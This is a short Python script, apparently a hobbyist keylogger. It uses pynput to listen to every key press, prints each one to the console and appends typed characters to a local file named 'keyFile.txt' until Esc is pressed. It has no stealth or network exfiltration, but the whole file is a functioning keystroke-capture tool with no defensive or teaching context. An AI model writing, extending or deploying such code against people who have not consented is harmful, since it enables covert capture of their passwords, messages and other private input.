from pynput import keyboard

def keypressed(key):
    print(str(key))
    if str(key) == "Key.esc":
        return exit()
    else:
        with open("keyFile.txt", "a") as log:
            try:
                char = key.char
                log.write(char)
            except:
                print("Error")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()